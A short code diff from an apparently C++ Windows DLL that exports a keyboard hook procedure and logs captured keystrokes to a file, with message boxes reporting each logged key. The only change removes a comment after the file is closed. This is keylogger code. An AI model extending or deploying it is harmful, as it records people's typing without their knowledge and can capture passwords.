@@ -34,7 +34,7 @@ extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM
                 logFile.flush();
                 MessageBoxA(NULL, "Unknown Key logged", "Info", MB_OK);
             }
-            logFile.close(); // Ensure the log is closed after each write
+            logFile.close();
         }
         else {
             MessageBoxA(NULL, "Failed to open log file", "Error", MB_OK);
